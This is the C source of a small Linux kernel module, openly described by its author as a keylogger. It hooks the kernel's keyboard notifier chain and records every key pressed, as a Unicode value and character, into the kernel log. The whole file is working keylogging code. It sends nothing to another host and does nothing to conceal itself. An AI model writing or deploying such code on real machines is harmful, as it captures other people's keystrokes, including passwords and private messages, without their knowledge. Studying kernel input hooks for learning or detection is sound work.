#include <linux/init.h>
#include <linux/module.h>
#include <linux/notifier.h>
#include <linux/keyboard.h>

MODULE_AUTHOR("Nicholas Hubbard");
MODULE_DESCRIPTION("A keylogger");
MODULE_LICENSE("GPL");

static int kloggg_log(struct notifier_block *nb, unsigned long action, void *data) {
  struct keyboard_notifier_param *param = data;

  if (action == KBD_UNICODE && param->down) {
    unsigned int unicode_val = param->value;
    printk(KERN_INFO "Unicode value: 0x%x (Character: %lc)\n", unicode_val, unicode_val);
  }
  
  return NOTIFY_OK;
}

static struct notifier_block kloggg_nb = {
  .notifier_call = kloggg_log
};

/* Module initialization */
static int __init kloggg_init(void) {
  register_keyboard_notifier(&kloggg_nb);
  return 0;
}

/* Module cleanup */
static void __exit kloggg_exit(void) {
  unregister_keyboard_notifier(&kloggg_nb);
}

module_init(kloggg_init);
module_exit(kloggg_exit);
